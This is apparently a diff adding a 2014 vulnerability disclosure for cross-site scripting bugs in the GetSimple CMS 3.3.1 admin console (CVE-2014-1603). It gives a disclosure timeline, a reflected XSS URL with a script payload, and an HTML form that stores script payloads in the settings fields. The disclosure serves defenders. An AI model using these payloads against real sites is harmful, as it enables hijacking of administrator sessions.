@@ -1,0 +1,32 @@
+PoC for XSS bugs in the admin console of GetSimple CMS 3.3.1
+CVE-2014-1603
+by Pedro Ribeiro (pedrib@gmail.com) from Agile Information Security
+Disclosure: 12/05/2014 / Last updated: 12/10/2014
+
+Timeline:
+	04/11/2013 - Found bugs, produced proof of concept.
+	05/11/2013 - Communicated to the developer, which acknowledged receipt.
+	10/01/2014 - Politely asked the developer for progress, no response.
+	17/01/2014 - Received CVE number from MITRE.
+	20/01/2014 - Communicated CVE number to the developer, no response.
+	29/01/2014 - Politely asked the developer for progress, no response.
+	12/05/2014 - Public release.
+==============================
+
+Reflected XSS in plugin load page:
+	http://192.168.56.101/getsimple/admin/load.php?id=anonymous_data&param="><script>alert(1)</script>
+
+Persistent XSS in settings page:
+	<form name="input" action="http://192.168.56.101/getsimple/admin/settings.php" method="post">
+	<input type="text" name="user" value=""><script>alert(1);</script>">
+	<input type="text" name="email" value=""><script>alert(2);</script>">
+	<input type="text" name="name" value=""><script>alert(3);</script>">
+	<input type="hidden" name="submitted" value="Save Settings">
+	<input type="submit" value="Submit">
+	</form>
+
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
